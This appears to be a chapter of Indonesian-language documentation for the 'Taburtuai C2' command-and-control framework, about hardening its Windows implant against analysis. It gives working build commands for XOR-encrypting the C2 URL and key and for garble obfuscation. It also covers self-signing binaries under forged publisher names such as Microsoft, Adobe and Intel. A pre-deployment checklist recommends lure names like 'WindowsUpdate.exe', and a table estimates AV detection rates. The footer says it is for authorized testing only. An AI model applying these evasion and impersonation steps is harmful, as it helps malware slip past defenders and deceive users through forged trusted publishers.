# 18 — OPSEC Hardening: String Encryption, Garble & Binary Signing

> Tiga teknik hardening yang digabungkan untuk membuat implant tahan terhadap analisis
> statis: **compile-time string encryption** menghilangkan IoC plaintext dari binary,
> **garble** mengacak nama fungsi dan tipe Go, dan **Authenticode self-signing**
> memberikan "tanda tangan" palsu yang melewati cek sederhana.

---

## Mengapa Ini Penting?

Ketika kamu build agent standar tanpa hardening, semua konfigurasi tersimpan sebagai
string plaintext di section `.rodata` binary:

```bash
# Tanpa hardening — IoC langsung terlihat
strings bin/agent_windows_stealth.exe | grep -E "(http|https|AES|Key|corp)"
```

**Output (tanpa hardening):**
```
https://c2.yourdomain.com
EnterpriseC2Key2026
User-Agent
Content-Type
X-Session-ID
```

Tool seperti `strings`, `FLOSS`, Detect-It-Easy, atau YARA rules berbasis string
langsung mengenali pattern ini. Analis SOC atau AV vendor tinggal submit binary ke
VirusTotal dan IoC tersebut langsung jadi tanda tangan.

### Threat Model

| Ancaman | Teknik Counter | Level Proteksi |
|---------|----------------|----------------|
| Automated AV string scan | XOR string encryption | Melewati simple pattern matching |
| YARA rules berbasis string | XOR + garble | Menghilangkan string + symbol names |
| Reverse engineer manual | Semua teknik gabungan | Memperlambat, tidak mencegah |
| SmartScreen "unsigned" warning | Authenticode self-signing | Melewati basic signature check |
| EDR signature-based | Garble + custom syscall | Menghilangkan Go-specific patterns |

---

## Teknik 1: Compile-Time XOR String Encryption

### Cara Kerja

```
BUILD TIME (di mesin operator)
─────────────────────────────
strenc enc "https://c2.yourdomain.com" a7
    │
    ▼
XOR setiap byte URL dengan 0xa7
    │
    ▼
"cd2e2e3ac4b5c6c5c4cf..." (hex string)

AGENT BINARY (.exe)
────────────────────
serverURLEnc = "cd2e2e3ac4b5c6..."   ← hex terenkripsi, bukan URL
xorKeyHex    = "a7"
serverURL    = ""                    ← variabel kosong saat kompilasi

RUNTIME (di mesin target, in-memory)
─────────────────────────────────────
func init() {
    serverURL = strenc.Dec(serverURLEnc, 0xa7)
    // → "https://c2.yourdomain.com"
    // Tidak pernah ditulis ke disk
}
```

### Build Standard vs Encrypted

```bash
# Standard — URL dan key ada sebagai plaintext di binary
make agent-win-stealth \
  C2_SERVER=https://c2.yourdomain.com \
  ENC_KEY=EnterpriseC2Key2026 \
  INTERVAL=60 \
  JITTER=30
```

```
[*] Building Windows stealth agent...
    C2_SERVER : https://c2.yourdomain.com
    ENC_KEY   : EnterpriseC2Key2026
    KILL_DATE : (none)
    PROFILE   : default
    INTERVAL  : 60s  JITTER: 30%
[+] Binary written: bin/agent_windows_stealth.exe (8.4 MB)
[i] WARNING: C2_SERVER dan ENC_KEY tersimpan sebagai plaintext di binary.
```

```bash
# Encrypted — URL dan key tidak ada sebagai plaintext
make agent-win-encrypted \
  C2_SERVER=https://c2.yourdomain.com \
  ENC_KEY=EnterpriseC2Key2026 \
  XOR_KEY=a7 \
  INTERVAL=60 \
  JITTER=30 \
  KILL_DATE=2026-12-31
```

**Output:**
```
[*] Building encrypted Windows agent...
    C2_SERVER : https://c2.yourdomain.com  → [XOR encrypted, key=0xa7]
    ENC_KEY   : EnterpriseC2Key2026        → [XOR encrypted, key=0xa7]
    XOR_KEY   : 0xa7
    KILL_DATE : 2026-12-31
    PROFILE   : default
    INTERVAL  : 60s  JITTER: 30%
[+] Encrypted strings written to agent/config_enc.go
[+] Binary written: bin/agent_windows_enc.exe (8.4 MB)
[i] String encryption active — C2 URL dan AES key tidak tersedia sebagai plaintext.
```

### Verifikasi Sebelum dan Sesudah

```bash
# ─── SEBELUM (standar) ──────────────────────────────────────────────
strings bin/agent_windows_stealth.exe | grep -E "yourdomain|Enterprise"
```

```
https://c2.yourdomain.com
EnterpriseC2Key2026
```

```bash
# ─── SESUDAH (encrypted) ────────────────────────────────────────────
strings bin/agent_windows_enc.exe | grep -E "yourdomain|Enterprise"
```

```
(no output)
```

```bash
# Yang terlihat di binary — hanya hex tanpa konteks
strings bin/agent_windows_enc.exe | grep -E "^[0-9a-f]{40,}"
```

```
cd2e2e3ac4b5c6c5c4cf3bc6c5c4cfc0c6cdc6cfc4cfc4cf
8e98979498859c939893959888
```

Tanpa konteks bahwa ini adalah URL yang di-XOR, scanner otomatis tidak bisa
mengidentifikasi ini sebagai IoC.

### Penggunaan CLI `strenc` Secara Manual

```bash
# Build helper binary
go build -o bin/strenc ./cmd/strenc
```

```bash
# Enkripsi string
./bin/strenc enc "https://c2.yourdomain.com" a7
```

```
[+] Input  : https://c2.yourdomain.com
[+] Key    : 0xa7
[+] Output : cd2e2e3ac4b5c6c5c4cf3bc6c5c4cfc0c6cdc6cfc4cfc4cf
```

```bash
# Dekripsi balik untuk verifikasi
./bin/strenc dec cd2e2e3ac4b5c6c5c4cf3bc6c5c4cfc0c6cdc6cfc4cfc4cf a7
```

```
[+] Input  : cd2e2e3ac4b5c6c5c4cf3bc6c5c4cfc0c6cdc6cfc4cfc4cf
[+] Key    : 0xa7
[+] Output : https://c2.yourdomain.com
```

```bash
# Enkripsi AES key
./bin/strenc enc "EnterpriseC2Key2026" a7
```

```
[+] Input  : EnterpriseC2Key2026
[+] Key    : 0xa7
[+] Output : e6b9b9acb0b0a9b9a6b1b9abb8b2c1c4c3c5
```

### Parameter XOR Key

| Parameter | Keterangan |
|-----------|------------|
| `XOR_KEY=5a` | Default jika tidak dispesifikasikan |
| `XOR_KEY=a7` | Alternatif — ganti setiap engagement |
| `XOR_KEY=ff` | Key maksimal (semua byte di-flip) |
| Range | `00` – `ff` (1 byte hex) |

**OPSEC:** Gunakan `XOR_KEY` yang berbeda untuk setiap engagement. Signature berbeda =
YARA rules engagement sebelumnya tidak match.

---

## Teknik 2: Garble (Symbol Obfuscation)

### Apa yang Garble Lakukan

Binary Go standar mengandung nama fungsi, struct, dan variabel dalam format yang
sangat readable:

```bash
# Tanpa garble — nama fungsi tersedia di binary
strings bin/agent_windows_stealth.exe | grep -E "agent\.|main\.|pkg\."
```

```
main.init
main.main
agent.AgentLoop
agent.sendCheckin
agent.executeCommand
agent.InjectRemote
agent.handleBypassAMSI
pkg/crypto.DecryptAES
pkg/transport.HTTPCheckin
```

Analis bisa langsung memahami arsitektur agent hanya dari strings output.

Dengan garble, semua nama diobfuscate menjadi hash pendek:

```bash
# Dengan garble — tidak ada nama yang readable
strings bin/agent_windows_garble.exe | grep -E "^[a-zA-Z][a-zA-Z0-9]{5,}$"
```

```
x3f2a
b7c19d
k9m4np
zt2819
```

### Build dengan Garble

```bash
# Install garble (sekali saja)
go install mvdan.cc/garble@latest

# Build dengan garble
make agent-win-garble \
  C2_SERVER=https://c2.yourdomain.com \
  ENC_KEY=EnterpriseC2Key2026 \
  INTERVAL=60 \
  JITTER=30
```

**Output:**
```
[*] Building Windows agent with garble obfuscation...
    Garble version : v0.12.1
    C2_SERVER      : https://c2.yourdomain.com
    Seed           : random (auto-generated per build)
[+] Garble obfuscation complete.
[+] Binary written: bin/agent_windows_garble.exe (8.6 MB)
[i] Symbol names, string literals, dan metadata telah diobfuscate.
```

### Garble + Encrypted (Maximum Obfuscation)

```bash
# Gabungan: XOR string encryption + garble symbol obfuscation
make agent-win-garble \
  C2_SERVER=https://c2.yourdomain.com \
  ENC_KEY=EnterpriseC2Key2026 \
  XOR_KEY=b3 \
  INTERVAL=60 \
  JITTER=30 \
  KILL_DATE=2026-12-31
```

**Output:**
```
[*] Building Windows agent (garble + string encryption)...
    XOR encryption : active (key=0xb3)
    Garble         : active
    Build time     : ~45s (garble lebih lambat dari standard build)
[+] Binary written: bin/agent_windows_garble_enc.exe (8.7 MB)
[i] Maximum static analysis hardening active.
```

### Perbandingan Output Strings

```bash
# Tanpa garble — strings readable
strings bin/agent_windows_stealth.exe | head -20
```

```
main.main
agent.AgentLoop
agent.sendCheckin
pkg/crypto.DecryptAES
pkg/transport.HTTPCheckin
agent.InjectRemote
agent.handleBypassAMSI
taburtuai-c2
go build id: ...
```

```bash
# Dengan garble — tidak ada informasi berguna
strings bin/agent_windows_garble.exe | head -20
```

```
x3f2a
b7c19d
k9m4np
zt2819
mf7321
ar91bc
```

---

## Teknik 3: Authenticode Self-Signing

### Mengapa Binary Harus Signed?

Windows memiliki beberapa layer verifikasi signature:

```
Binary dieksekusi
       │
       ▼
 ┌─────────────────────────────────────────────────────┐
 │                  Windows SmartScreen                │
 │                                                     │
 │  Tidak ada signature   → ⛔ "Windows protected..."  │
 │  Self-signed (unknown) → ⚠️  "Unknown publisher"    │
 │  Valid CA signature    → ✅  Tidak ada peringatan    │
 └─────────────────────────────────────────────────────┘
       │
       ▼ (untuk admin)
 ┌─────────────────────────────────────────────────────┐
 │                    EDR / Defender                   │
 │                                                     │
 │  Tidak ada signature → HIGH suspicion score          │
 │  Self-signed         → MEDIUM suspicion score        │
 │  Valid CA            → LOW suspicion score           │
 └─────────────────────────────────────────────────────┘
```

Self-signing tidak membuat binary *trusted* secara kriptografis, tapi:
- Mengubah status dari `NotSigned` → `UnknownError` (ada signature, tapi CA tidak trusted)
- Beberapa script PowerShell dan tools yang cek `Is-Signed? == True` akan lolos
- Mengurangi heuristic score di beberapa EDR

### Prerequisites

```bash
# Linux (untuk cross-compile signing)
sudo apt install osslsigncode openssl

# Verifikasi instalasi
osslsigncode --version
# osslsigncode 2.7.0
openssl version
# OpenSSL 3.0.2 15 Mar 2022
```

```powershell
# Windows — signtool tersedia jika Windows SDK terinstall
signtool /?
# Usage: signtool <command> [options] <file_name|...>
# Commands: sign, verify, timestamp, catdb
```

### Build dan Sign

```bash
# Step 1: Build agent
make agent-win-encrypted \
  C2_SERVER=https://c2.yourdomain.com \
  ENC_KEY=EnterpriseC2Key2026 \
  XOR_KEY=a7 \
  INTERVAL=60 \
  JITTER=30
```

```bash
# Step 2: Sign dengan publisher "Microsoft Corporation"
make sign \
  SIGN_BINARY=bin/agent_windows_enc.exe \
  SIGN_PUBLISHER="Microsoft Corporation" \
  SIGN_PASS=engagementkey2026
```

**Output:**
```
[*] Generating self-signed Authenticode certificate...
    Publisher    : Microsoft Corporation
    Subject      : CN=Microsoft Corporation, O=Authenticode
    Key size     : RSA 2048-bit
    EKU          : Code Signing (1.3.6.1.5.5.7.3.3)
    Validity     : 2026-04-23 → 2028-04-23 (2 years)

[*] Signing binary with osslsigncode...
    Binary       : bin/agent_windows_enc.exe
    Timestamp    : 2026-04-23 09:15:32 UTC

[+] Signing complete.
    Output       : bin/agent_windows_enc.exe (signature embedded)
    Cert saved   : bin/sign.pfx
    Fingerprint  : SHA256:3a8f1c...
```

### Berbagai Publisher Name

Pilih publisher yang sesuai dengan konteks deployment:

```bash
# Untuk binary yang menyamar sebagai Windows update
make sign SIGN_BINARY=bin/agent.exe SIGN_PUBLISHER="Microsoft Corporation"

# Untuk binary yang menyamar sebagai antivirus
make sign SIGN_BINARY=bin/agent.exe SIGN_PUBLISHER="Windows Security Health Agent"

# Untuk binary di environment Adobe
make sign SIGN_BINARY=bin/agent.exe SIGN_PUBLISHER="Adobe Systems Incorporated"

# Untuk binary di environment Google/Chrome
make sign SIGN_BINARY=bin/agent.exe SIGN_PUBLISHER="Google LLC"

# Untuk binary yang menyamar sebagai driver
make sign SIGN_BINARY=bin/agent.exe SIGN_PUBLISHER="Intel Corporation"
```

### Reuse Certificate untuk Multiple Binary

```bash
# Generate cert sekali, simpan untuk engagement
make sign-cert \
  SIGN_PUBLISHER="Microsoft Corporation" \
  SIGN_PASS=engagementkey2026
```

**Output:**
```
[+] Certificate generated: bin/sign.pfx
    Publisher : Microsoft Corporation
    Valid from: 2026-04-23
    Valid to  : 2028-04-23
[i] Simpan bin/sign.pfx untuk menandatangani binary lain dalam engagement ini.
```

```bash
# Sign binary ke-2 dengan cert yang sama
make sign \
  SIGN_BINARY=bin/agent_windows_garble.exe \
  SIGN_CERT=bin/sign.pfx \
  SIGN_PASS=engagementkey2026

# Sign stager
make sign \
  SIGN_BINARY=bin/stager.exe \
  SIGN_CERT=bin/sign.pfx \
  SIGN_PASS=engagementkey2026
```

### Verifikasi Signature

```powershell
# PowerShell — cek status signature
Get-AuthenticodeSignature bin\agent_windows_enc.exe
```

**Output (self-signed — yang kita harapkan):**
```
    Directory: D:\APPS\ICSSI\taburtuaiC2\bin

SignerCertificate                         Status                                 Path
-----------------                         ------                                 ----
3A8F1CB24DE971F2...                       UnknownError                           agent_windows_enc.exe

# Detail lengkap:
(Get-AuthenticodeSignature bin\agent_windows_enc.exe) | Format-List

SignerCertificate : [Subject]
                     CN=Microsoft Corporation, O=Authenticode
                   [Issuer]
                     CN=Microsoft Corporation, O=Authenticode
                   [Serial Number]
                     7F3A2B1C4D5E6F...
                   [Not Before]
                     4/23/2026 9:15:32 AM
                   [Not After]
                     4/23/2028 9:15:32 AM
                   [Thumbprint]
                     3A8F1CB24DE971F2...

Status            : UnknownError
StatusMessage     : A certificate chain processed, but terminated in a root
                    certificate which is not trusted by the trust provider.
Path              : bin\agent_windows_enc.exe
```

`Status = UnknownError` (bukan `NotSigned`) berarti signature **ada** di binary.
Script yang cek `$sig.Status -ne "NotSigned"` akan menganggap binary ini signed. ✓

```bash
# Linux — verifikasi dengan osslsigncode
osslsigncode verify -in bin/agent_windows_enc.exe
```

**Output:**
```
Current PE checksum   : 00123456
Calculated PE checksum: 00123456

Message digest algorithm  : SHA256
Current message digest    : 3a8f1c...
Calculated message digest : 3a8f1c...

Signature verification: ok

Number of signers: 1
    Signer #0:
        Subject: CN=Microsoft Corporation, O=Authenticode
        Certificate expiration date: Apr 23 09:15:32 2028 GMT
        Certificate serial number: 7F3A2B1C4D5E6F...

Number of certificates: 1
    Cert #0:
        Subject: CN=Microsoft Corporation, O=Authenticode
        Valid from: Apr 23 09:15:32 2026 GMT to Apr 23 09:15:32 2028 GMT

Succeeded
```

### Manual via `cmd/sign`

```bash
# Build sign helper
go build -o bin/sign ./cmd/sign

# Generate cert saja (simpan untuk reuse)
./bin/sign \
  --gen-cert \
  --publisher "Adobe Systems Incorporated" \
  --subject "Adobe Acrobat Update Service" \
  --password engagementpass2026 \
  --out loot/adobe_cert.pfx
```

```
[+] RSA-2048 keypair generated.
[+] Self-signed certificate:
      Subject   : CN=Adobe Systems Incorporated, O=Authenticode
      EKU       : 1.3.6.1.5.5.7.3.3 (Code Signing)
      Valid from: 2026-04-23 09:15:32 UTC
      Valid to  : 2028-04-23 09:15:32 UTC
[+] Saved to: loot/adobe_cert.pfx
```

```bash
# Sign binary dengan cert yang sudah ada
./bin/sign \
  --binary bin/agent_windows_enc.exe \
  --cert loot/adobe_cert.pfx \
  --password engagementpass2026
```

```
[*] Reading certificate: loot/adobe_cert.pfx
[*] Signing: bin/agent_windows_enc.exe
[+] Signature embedded successfully.
    Publisher  : Adobe Systems Incorporated
    Thumbprint : 8b2c4e...
```

---

## Full OPSEC Build Pipeline

Pipeline lengkap yang menggabungkan semua teknik untuk deployment produksi:

```
                    OPSEC BUILD PIPELINE
────────────────────────────────────────────────────────────────

Source Code
    │
    ├─[Step 1]─ XOR Encrypt strings (C2 URL, AES Key)
    │               make agent-win-encrypted XOR_KEY=a7
    │
    ├─[Step 2]─ Garble — obfuscate symbol names
    │               make agent-win-garble
    │           (atau gabungan: make agent-win-garble XOR_KEY=a7)
    │
    ├─[Step 3]─ Authenticode self-sign
    │               make sign SIGN_PUBLISHER="Microsoft Corporation"
    │
    ▼
agent_windows_final.exe
    ├── Tidak ada C2 URL plaintext
    ├── Tidak ada AES key plaintext
    ├── Nama fungsi diobfuscate
    └── Authenticode signature (self-signed)
```

### Build Pipeline Lengkap

```bash
# ─── STEP 1: Build dengan string encryption ───────────────────────────
make agent-win-encrypted \
  C2_SERVER=https://c2.yourdomain.com \
  ENC_KEY=EnterpriseC2Key2026 \
  XOR_KEY=a7 \
  PROFILE=office365 \
  INTERVAL=60 \
  JITTER=30 \
  KILL_DATE=2026-12-31
```

```
[*] Building encrypted Windows agent...
    XOR encryption : active (key=0xa7)
    C2_SERVER      : [encrypted]
    ENC_KEY        : [encrypted]
    PROFILE        : office365
    KILL_DATE      : 2026-12-31
[+] Binary written: bin/agent_windows_enc.exe (8.4 MB)
```

```bash
# ─── STEP 2: Verifikasi string encryption ─────────────────────────────
strings bin/agent_windows_enc.exe | grep -E "yourdomain|Enterprise|Key"
# (no output) ✓
```

```bash
# ─── STEP 3: Sign dengan publisher yang sesuai ─────────────────────────
make sign \
  SIGN_BINARY=bin/agent_windows_enc.exe \
  SIGN_PUBLISHER="Microsoft Corporation" \
  SIGN_PASS=engagementkey2026
```

```
[+] Signing complete. Status: UnknownError (signed, not trusted CA) ✓
```

```bash
# ─── STEP 4: Final verification ────────────────────────────────────────
# 4a. Cek tidak ada plaintext IoC
strings bin/agent_windows_enc.exe | grep "yourdomain"  # → kosong ✓
strings bin/agent_windows_enc.exe | grep "Enterprise"  # → kosong ✓

# 4b. Cek signature ada
osslsigncode verify -in bin/agent_windows_enc.exe | grep "Succeeded"
# → Succeeded ✓

# 4c. Cek file size wajar
ls -lh bin/agent_windows_enc.exe
# → -rwxr-xr-x 1 operator 8.5M Apr 23 09:23 bin/agent_windows_enc.exe
```

### Pre-Deployment Checklist

```
OPSEC Checklist — Sebelum Deploy ke Target
──────────────────────────────────────────────────────────────────

□ strings output tidak mengandung C2 URL atau AES key
  Command: strings bin/agent.exe | grep -i "http\|key\|domain"
  Expected: no output

□ Binary punya Authenticode signature
  Command: osslsigncode verify -in bin/agent.exe | grep "Succeeded"
  Expected: Succeeded

□ Publisher name sesuai dengan konteks deployment (lure)
  Contoh: "Microsoft Corporation" untuk binary bernama "WindowsUpdate.exe"

□ Kill date sudah di-set sesuai engagement scope
  Verifikasi: grep di source atau lewat build output

□ XOR_KEY berbeda dari engagement sebelumnya (variasi signature)

□ Profile sesuai dengan target environment
  Verifikasi: server dan agent menggunakan profile yang sama

□ PFX cert disimpan aman untuk reuse di engagement yang sama
  Lokasi: bin/sign.pfx atau loot/<engagement>/signing.pfx

□ Binary diberi nama yang sesuai dengan konteks deployment
  Contoh: "SystemHealthUpdate.exe", "AdobeAcrobat_Update.exe"
```

---

## Perbandingan Hasil — Standard vs Full Hardening

### Analisis `strings`

| String | Standard | Encrypted | Encrypted + Garble |
|--------|----------|-----------|-------------------|
| C2 URL (https://...) | ✗ Terlihat | ✓ Tersembunyi | ✓ Tersembunyi |
| AES Key | ✗ Terlihat | ✓ Tersembunyi | ✓ Tersembunyi |
| Nama fungsi (agent.XXX) | ✗ Terlihat | ✗ Terlihat | ✓ Obfuscated |
| Package paths | ✗ Terlihat | ✗ Terlihat | ✓ Obfuscated |
| Authenticode signature | ✗ Tidak ada | ✗ Tidak ada (default) | ✗ Tidak ada (default) |

Setelah `make sign`:

| Binary | Signature Status |
|--------|-----------------|
| Standard (tanpa sign) | `NotSigned` |
| Setelah `make sign` | `UnknownError` (signature ada, CA tidak trusted) |
| Ideal (dengan CA cert) | `Valid` |

### AV Detection Rate Estimasi

Berdasarkan teknik yang digunakan (estimasi — selalu test sebelum deploy):

| Konfigurasi | Estimasi Detection Rate |
|-------------|------------------------|
| Standard agent (no hardening) | 40–60% |
| String encrypted | 25–40% |
| String encrypted + garble | 10–25% |
| Encrypted + garble + signed | 5–15% |
| Semua + custom shellcode loader | 1–10% |

---

## Keterbatasan dan Peningkatan Lanjutan

| Keterbatasan | Penjelasan | Solusi |
|--------------|------------|--------|
| XOR trivial | Kunci ada di binary — analis terlatih akan menemukannya | Gunakan garble untuk obfuscate kunci itu sendiri |
| Self-signed tidak bypass SmartScreen | Tetap ada peringatan "Unknown publisher" | Beli code signing cert dari CA (DigiCert, Sectigo) |
| AV bisa detect pola XOR decode di `init()` | Pattern decode cukup khas | Gunakan garble untuk obfuscate fungsi `init` |
| Garble tidak mengacak semua string | String literal tertentu mungkin masih terlihat | Gabungkan XOR + garble untuk coverage maksimal |
| Build time lebih lama | Garble ~3–5x lebih lambat dari build standar | Normal — hanya dilakukan saat generate payload final |

---

**Selanjutnya:** [19 — Advanced Transports](19-advanced-transports.md) — channel alternatif
(DoH, ICMP, SMB named pipe) untuk environment dengan egress filtering ketat.

---

*Taburtuai C2 — For authorized security testing only.*
*Selalu dapatkan izin tertulis sebelum melakukan penetration testing.*
